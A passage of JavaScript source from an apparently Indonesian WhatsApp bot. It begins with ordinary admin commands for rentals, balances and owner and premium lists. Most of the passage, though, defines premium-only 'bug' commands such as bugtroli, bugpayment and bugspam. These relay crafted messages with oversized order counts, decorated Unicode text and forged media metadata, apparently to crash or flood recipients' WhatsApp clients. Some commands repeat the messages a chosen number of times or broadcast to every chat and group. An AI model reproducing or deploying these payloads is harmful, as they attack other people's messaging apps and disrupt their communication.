global.setDatabase('sewa.json', JSON.stringify(sewa))
setReply(`Succes delete sewa`)
} else if (!isGroup && q) {
if (!sewa.includes(q)) return setReply("tidak ada di database kak")
let deleteData = sewa.indexOf(q)
sewa.splice(deleteData, 1)
global.setDatabase('sewa.json', JSON.stringify(sewa))
setReply(`Succes delete sewa`)
}
} catch (err){
console.log(err)
setReply("Terjadi Error")
}
break
case 'delsaldo':
case 'kurangsaldo':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return setReply(`Format salah!\nCONTOH :\n ${prefix + command} ${nomerOwner} jumlah`)
if (mentionByReply) {
kurangBalance(mentionByReply.split('@')[0], parseInt(args[0]))
setReply(`Berhasil kurangi saldo : ${args[0]}\nNo : ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
kurangBalance(mentionByTag[0].split('@')[0], parseInt(args[1]))
await setReply(`Berhasil kurangi saldo : ${args[1]}\nNo : ${mentionByTag[0].split('@')[0]}`)
} else if (!mentionByReply && !mentionByTag[0]) {
var nomor = q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')
kurangBalance(nomor + '@s.whatsapp.net', q.split("|")[1])
await setReply(`Berhasil kurangi saldo : ${q.split("|")[1]}\nNo : ${nomor}️`)
} else setReply('Tag atau Reply usernya')
break
case 'listowner':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let teks = '┌──⭓「 *LIST OWNER* 」\n│\n'
for (let x of owner) {
teks += `│⭔ wa.me/${x.split("@")[0]}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${owner.length}*`
setReply(teks)
}
break
case 'listlimit':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let limitnya = `*LIST LIMIT*\nJumlah : ${JSON.parse(fs.readFileSync('./database/user.json')).length}\n\n`
JSON.parse(fs.readFileSync('./database/user.json')).map(function (e, i) {
limitnya += i + 1 + `📲 Nomer : wa.me/${e.id}\n    📉 Limit : ${e.limit}\n\n`
})
setReply(limitnya)
break
case 'listprem':
case 'listpremium':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let teks = '┌──⭓「 *LIST PREMIUM* 」\n│\n'
for (let x of premium) {
teks += `│⭔ wa.me/${x.split("@")[0]}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${premium.length}*`
setReply(teks)
}
break
case 'listsewa':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let teks = '「 *LIST SEWA* 」\n'
for (let x of sewa) {
let metadata2 = await Araa.groupMetadata(x)
var url = await Araa.groupInviteCode(metadata2.id).catch(() => console.log(mess.error.api))
let asu = 'https://chat.whatsapp.com/undefined' ? 'Tidak di ketahui' : 'https://chat.whatsapp.com/' + url
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Link Gc : ${asu}\n\n`
}
teks += `\n*Total ada : ${sewa.length}*`
setReply(teks)
}
break    
case 'clearallowner':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner() 
Object.keys(owner).forEach((i) => {
owner.splice(owner[i], 1)
global.setDatabase('owner.json', JSON.stringify(owner))
})
setReply('Sukses')
}
break 
case 'clearallprem':
case 'clearallpremium':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner() 
Object.keys(premium).forEach((i) => {
premium.splice(premium[i], 1)
global.setDatabase('premium.json', JSON.stringify(premium))
})
setReply('Sukses')
}
break 
case 'clearallsewa':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner() 
Object.keys(sewa).forEach((i) => {
sewa.splice(sewa[i], 1)
global.setDatabase('sewa.json', JSON.stringify(sewa))
})
setReply('Sukses')
}
break 
//================================================================================\\                
case 'bugdelete':
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isPremium && !m.key.fromMe) return onlyPrem()
Araa.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: m.id, participant: '0️' } })
break
case 'buginvite':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
let buginvite = generateWAMessageFromContent(
from,
{
groupInviteMessage: {
groupJid: '6283144394823@g.us',
inviteCode: 'UkJdqTXupAtmDwo4',
inviteExpiration: '1643553084',
invitetime: '1643293887000',
groupName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
thumbnail: ofrply,
caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
contextInfo: {
forwardingScore: 150,
isForwarded: true,
},
},
},
{ quoted: bugkontak })
Araa.relayMessage(from, buginvite.message, { messageId: buginvite.key.id })
}
break
case 'bugpayment':
case 'bugpay':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
Araa.relayMessage(from, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}
break
case 'bugpolling':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
var pollCreation = generateWAMessageFromContent(
from,
proto.Message.fromObject({
pollCreationMessage: {
name: 'HALO DEKK 🥶',
options: [
{
optionName: 'VOTE YUK',
},
{
optionName: 'BERANI VOTE GK',
},
{
optionName: 'VOTE LAH SEMUA',
},
{
optionName: 'KATANYA WA KEBAL',
},
{
optionName: 'SALAM CREATOR BOT',
},
],
selectableOptionsCount: 5,
},
}),
{ userJid: from, quoted: bugkontak })
Araa.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
}
break
case 'bugtroli':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var order = generateWAMessageFromContent(
from,
proto.Message.fromObject({
orderMessage: {
orderId: '594071395007984',
orderImage: messa.imageMessage,
itemCount: 100000000000,
status: 'INQUIRY',
surface: 'CATALOG',
message: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
jpegThumbnail: ofrply,
orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
sellerJid: '628979185922@s.whatsapp.net',
token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',
totalAmount1000: '500000000000000',
totalCurrencyCode: 'IDR',
},
}),
{ userJid: from, quoted: bugkontak }
)
Araa.relayMessage(from, order.message, { messageId: order.key.id })
}
break
case 'bugaudio':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
var audio = generateWAMessageFromContent(
from,
proto.Message.fromObject({
audioMessage: {
url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',
mimetype: 'audio/mpeg',
fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',
fileLength: '258330',
seconds: 16,
ptt: false,
mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',
fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',
directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',
mediaKeyTimestamp: '1657190832',
},
}),
{ userJid: from, quoted: bugkontak })
Araa.relayMessage(from, audio.message, { messageId: audio.key.id })
}
break
case 'bugimage':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var image = generateWAMessageFromContent(
from,
proto.Message.fromObject({
imageMessage: {
url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',
mimetype: 'image/jpeg',
caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',
fileLength: '42521',
height: 426,
width: 640,
mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',
fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',
directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',
mediaKeyTimestamp: '1657286523',
jpegThumbnail: messa.imageMessage,
},
}),
{ userJid: from, quoted: bugkontak })
Araa.relayMessage(from, image.message, { messageId: image.key.id })
}
break
case 'bugdocument':
case 'bugdoc':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
var document = generateWAMessageFromContent(
from,
proto.Message.fromObject({
documentMessage: {
url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',
mimetype: 'application/octet-stream',
title: '.dev',
fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',
pageCount: 0,
mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',
fileName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',
directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',
mediaKeyTimestamp: '1657288637',
},
}),
{ userJid: from, quoted: bugkontak }
)
Araa.relayMessage(from, document.message, { messageId: document.key.id })
}
break
case 'bugsticker':
case 'bugstick':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
var sticker = generateWAMessageFromContent(
from,
proto.Message.fromObject({
stickerMessage: {
url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',
fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',
fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',
mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',
mimetype: 'image/webp',
height: 64,
width: 64,
directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',
fileLength: '7774',
mediaKeyTimestamp: '1657290167',
isAnimated: false,
},
}),
{ userJid: from, quoted: bugkontak })
Araa.relayMessage(from, sticker.message, { messageId: sticker.key.id })
}
break
case 'buglokasi':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var liveLocation = generateWAMessageFromContent(
from,
proto.Message.fromObject({
liveLocationMessage: {
degreesLatitude: -6.9367014,
degreesLongitude: 107.7228574,
caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
sequenceNumber: '1657237469254001',
jpegThumbnail: messa.imageMessage,
},
}),
{ userJid: from, quoted: bugkontak }
)
Araa.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
}
break
case 'bugkatalog':
case 'bugcatalog':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
Araa.sendKatalog(from, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
}
break
case 'bugbutton':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
Araa.sendMessage(from, { 
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
break
case 'bugtag':{
if (!isGroup) return onlyGroup()
if (!isPremium && !m.key.fromMe) return onlyPrem()
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
Araa.sendMessage(from, { text: `@${org.split('@')[0]}`, mentions: [org] }, { quoted: bugkontak })
}
break
case 'bugtagall':{
if (!isGroup) return onlyGroup()
if (!isPremium && !m.key.fromMe) return onlyPrem()
let teks = `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
Araa.sendMessage(from, { text: teks, mentions: participants.map((a) => a.id) }, { quoted: bugkontak })
}
break
case 'bugpc':
if (!isPremium && !m.key.fromMe) return onlyPrem()
var facahjs = await store.chats.all()
for (let i of facahjs) {
await Araa.sendMessage(i.id, { text: `TURU DECK 🥶` }, { quoted: bugkontak })
await sleep(1000)
}
break
case 'buggc':
if (!isPremium && !m.key.fromMe) return onlyPrem()
let ygcx = groupss.map((v) => v.id)
for (let i of ygcx) {
await Araa.sendMessage(i, { text: `TURU DECK 🥶` }, { quoted: bugkontak })
await delay(1000)
}
break
case 'bugspam':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6283144394823@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ofrply, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: bugkontak })
var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: bugkontak })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ofrply,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: bugkontak })
var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: bugkontak })
var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: bugkontak })
var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: bugkontak })
var sticker = generateWAMessageFromContent(from,proto.Message.fromObject({stickerMessage: {url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',mimetype: 'image/webp',height: 64,width: 64,directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',fileLength: '7774',mediaKeyTimestamp: '1657290167',isAnimated: false,},}),{ userJid: from, quoted: bugkontak })
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: bugkontak })
Araa.relayMessage(from, buginvite.message, { messageId: buginvite.key.id })
Araa.relayMessage(from, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
Araa.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
Araa.relayMessage(from, order.message, { messageId: order.key.id })
Araa.relayMessage(from, audio.message, { messageId: audio.key.id })
Araa.relayMessage(from, image.message, { messageId: image.key.id })
Araa.relayMessage(from, document.message, { messageId: document.key.id })
Araa.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
Araa.relayMessage(from, sticker.message, { messageId: sticker.key.id })
Araa.sendKatalog(from, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
Araa.sendMessage(from, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
}
break                
case 'buginvitev':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
let buginvite = generateWAMessageFromContent(
from,
{
groupInviteMessage: {
groupJid: '6283144394823@g.us',
inviteCode: 'UkJdqTXupAtmDwo4',
inviteExpiration: '1643553084',
invitetime: '1643293887000',
groupName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
thumbnail: ofrply,
caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
contextInfo: {
forwardingScore: 150,
isForwarded: true,
},
},
},
{ quoted: bugkontak })
Araa.relayMessage(from, buginvite.message, { messageId: buginvite.key.id })
}
}
break
case 'bugpaymentv':
case 'bugpayv':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
Araa.relayMessage(from, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}
}
break
case 'bugpollingv':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
var pollCreation = generateWAMessageFromContent(
from,
proto.Message.fromObject({
pollCreationMessage: {
name: 'HALO DEKK 🥶',
options: [
{
optionName: 'VOTE YUK',
},
{
optionName: 'BERANI VOTE GK',
},
{
optionName: 'VOTE LAH SEMUA',
},
{
optionName: 'KATANYA WA KEBAL',
},
{
optionName: 'SALAM CREATOR BOT',
},
],
selectableOptionsCount: 5,
},
}),
{ userJid: from, quoted: bugkontak })
Araa.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
}
}
break
case 'bugtroliv':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var order = generateWAMessageFromContent(
from,
proto.Message.fromObject({
orderMessage: {
orderId: '594071395007984',
orderImage: messa.imageMessage,
itemCount: 100000000000,
status: 'INQUIRY',
surface: 'CATALOG',
message: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
jpegThumbnail: ofrply,
orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
sellerJid: '628979185922@s.whatsapp.net',
token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',
totalAmount1000: '500000000000000',
totalCurrencyCode: 'IDR',
},
}),
{ userJid: from, quoted: bugkontak })
Araa.relayMessage(from, order.message, { messageId: order.key.id })
}
}
break
case 'bugaudiov':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
var audio = generateWAMessageFromContent(
from,
proto.Message.fromObject({
audioMessage: {
url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',
mimetype: 'audio/mpeg',
fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',
fileLength: '258330',
seconds: 16,
ptt: false,
mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',
fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',
directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',
mediaKeyTimestamp: '1657190832',
},
}),
{ userJid: from, quoted: bugkontak })
Araa.relayMessage(from, audio.message, { messageId: audio.key.id })
}
}
break
case 'bugimagev':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var image = generateWAMessageFromContent(
from,
proto.Message.fromObject({
imageMessage: {
url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',
mimetype: 'image/jpeg',
caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',
fileLength: '42521',
height: 426,
width: 640,
mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',
fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',
directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',
mediaKeyTimestamp: '1657286523',
jpegThumbnail: messa.imageMessage,
},
}),
{ userJid: from, quoted: bugkontak })
Araa.relayMessage(from, image.message, { messageId: image.key.id })
}
}
break
case 'bugdocumentv':
case 'bugdocv':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply(`Jumlahnya?`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
for (let i = 0; i < args[0]; i++) {
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var document = generateWAMessageFromContent(
from,
proto.Message.fromObject({
documentMessage: {
url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',
mimetype: 'application/octet-stream',
title: '.dev',
fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',
pageCount: 0,
mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',
fileName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',
directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',
mediaKeyTimestamp: '1657288637',
},
}),
{ userJid: from, quoted: bugkontak })
Araa.relayMessage(from, document.message, { messageId: document.key.id })
}
}
break
case 'bugstickerv':
case 'bugstickv':{
if (!isPremium && !m.key.fromMe) return onlyPrem()
